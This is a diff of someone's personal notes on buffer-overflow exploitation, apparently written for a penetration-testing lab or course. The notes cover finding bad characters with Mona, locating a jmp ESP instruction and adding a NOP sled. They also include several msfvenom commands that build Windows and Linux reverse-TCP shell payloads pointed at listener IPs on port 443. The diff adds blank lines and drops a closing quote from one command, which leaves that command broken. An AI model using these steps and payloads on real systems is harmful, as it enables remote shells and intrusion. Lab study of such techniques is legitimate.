@@ -15,8 +15,11 @@ This Rep describes my steps for BoF.
 2. Find bad Characters, send all chars, in hex to File and filter out bad ones: 
 3. shortcut with Mona: !mona config -set workingfolder c:\log\%p
    !mona bytearray -> create bytearray.bin
+   
    !mona compare -f C:\log\bad-characters-windows-4\bytearray.bin -a 005756C8 (address is where Badchars start, usually EBX?) 
+   
    !mona bytearray -cpb "\x00\x06\x0a\x1a\"
+   
    !mona compare -f C:\log\bad-characters-windows-4\bytearray.bin -a 005756C8 (address is where Badchars start, usually EBX?) 
 
 4. find a jmp ESP instruction in code, so that we can put in our shellcode 
@@ -32,7 +35,7 @@ This Rep describes my steps for BoF.
 7. next add 16x NOPs: b"\x90" *16
 8. new code: #buf = b"A" * OFFSET + EIP + "\x90" *16
 9. create the shellcode with MSFvenom:
-       msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -f py -v buf -b "\x00\x06\x0a\x1a\x3b\xcf"
+       msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -f py -v buf -b "\x00\x06\x0a\x1a\x3b\xcf
        msfvenom -p windows/exec CMD='cmd.exe' --format c -b "\x00\x06\x0A\x1A\x3B\xCF\x0d\xff" -f raw -o exploit.txt
        msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.178 LPORT=443 -o exploit.txt -b "\x00\x0a\x1a"
        msfvenom -a x86 --platform Linux -p linux/x86/shell_reverse_tcp LHOST=192.168.45.221 LPORT=443 -f py -v buf -b "\x00\x0a\x0d\x1a\x20\x43\x75\x9e\xbc"
